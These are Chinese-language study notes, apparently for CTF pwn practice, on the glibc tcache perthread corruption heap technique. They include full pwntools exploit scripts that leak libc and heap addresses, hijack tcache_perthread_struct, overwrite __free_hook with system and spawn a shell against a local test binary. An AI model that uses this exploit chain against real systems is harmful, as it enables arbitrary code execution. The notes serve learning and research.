<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># tcache perthread corruption,tcache perthread corruption</title>
    <link rel="stylesheet" href="/assets/css/notes.min.css">
</head>
<body>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>tcache perthread corruption</h1>
<h2>1.基本原理</h2>
<p>tcache_perthread_struct 通常处在 heap 的最开始，通常使用 tcache poisoning malloc 控制，并且如果控制了 tcache_perthread_struct，那么整个 tcache 也就相当于被控制了，我们也可以实现任意地址 malloc 了</p>
<p>tips：获取地址时，我们可以使用泄露的堆地址 <code>&amp; ~0xfff</code>, 因为 tcache_perthread_struct 在 heap 开始的地方，末 3 位是 0</p>
<p>此外，house of io利用手法也是利用的tcache_perthread_struct 结构体，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 tcache 的分配。但是这里需要注意，我们需要在0x240大小的堆块上进行操作，这样申请到tcache_perthread_struct 的时候该tcache的count就为-1了，释放的时候就不会进入tcache了，而是进入unsorted bin</p>
<pre><code class="language-python">add_chunk(2, 0x240)
delete_chunk(2)
delete_chunk(2)
add_chunk(2, 0x240)
show_chunk(2)
heap_addr = u64(rl()[0:4].ljust(8, b&quot;\x00&quot;)) &amp; ~0xfff
li(&quot;heap_addr&quot;, heap_addr)

edit_chunk(2, p64(heap_addr + 0x10))
add_chunk(0, 0x240)
add_chunk(0, 0x240)
delete_chunk(0)
add_chunk(0, 0x240)
gdb.attach(p)

it()
</code></pre>
<p><img src="/0101/PWN/堆利用/BinAttack/assets/10.tcache_perthread_corruption/image-20250222092001399.png" alt="image-20250222092001399"></p>
<h2>2.利用思路</h2>
<p>漏洞程序参考漏洞程序参考 unsortedbin leak 的测试程序</p>
<pre><code class="language-python">from pwn import *
# patchelf --set-interpreter new_ld_address file_path
# patchelf --replace-needed old_libc.so.6 new_libc.so.6 file_path
# pycharm # ctrl+/

# local pwn
elf_path = './test_tcache'
elf = ELF(elf_path)
libc = ELF('/home/ubuntu/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)

p = process([elf_path])

#-----------------------------------------------------------------------------------------
it      = lambda                    :p.interactive()
sd      = lambda data               :p.send((data))
sa     	= lambda delim,data         :p.sendafter((delim), (data))
sl      = lambda data               :p.sendline((data))
sla     = lambda delim,data         :p.sendlineafter((delim), (data))
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=False :p.recvuntil(delims, drop)
rl      = lambda                    :p.recvline()
l       = lambda str1               :log.success(str1)
li      = lambda str1,data1         :log.success(str1+' ========&gt; '+hex(data1))
uu32    = lambda data               :u32(data.ljust(4, b&quot;\x00&quot;))
uu64    = lambda data               :u64(data.ljust(8, b&quot;\x00&quot;))
u32Leakbase = lambda offset         :u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
u64Leakbase = lambda offset         :u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset
#-----------------------------------------------------------------------------------------

def add_chunk(index, size):
    sla(b&quot;choice:\n&quot;, b&quot;1&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;size:\n&quot;, str(size).encode())

def delete_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;2&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def edit_chunk(index, content):
    sla(b&quot;choice:\n&quot;, b&quot;3&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;length:\n&quot;, str(len(content)).encode())
    sa(b&quot;content:\n&quot;, content)

def show_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;4&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def exit_p():
    sla(b&quot;choice:\n&quot;, b&quot;5&quot;)

# leak libc
add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
libc_addr = u64Leakbase(0x3ebca0)
li(&quot;libc_addr&quot;, libc_addr)

add_chunk(2, 0x100)
delete_chunk(2)
delete_chunk(2)
add_chunk(2, 0x100)
show_chunk(2)
heap_addr = u64(rl()[0:4].ljust(8, b&quot;\x00&quot;)) &amp; ~0xfff
li(&quot;heap_addr&quot;, heap_addr)
edit_chunk(2, p64(heap_addr))
add_chunk(2, 0x100)
add_chunk(2, 0x100)

edit_chunk(2, p8(7)*64 + p64(libc.sym['__free_hook'] + libc_addr)*64)
add_chunk(2, 0x10)
edit_chunk(2, p64(libc.sym['system'] + libc_addr))
add_chunk(3, 0x10)
edit_chunk(3, b'/bin/sh\x00')
delete_chunk(3)
# gdb.attach(p)

it()
</code></pre>

        </main>
    </div>
</body>
</html>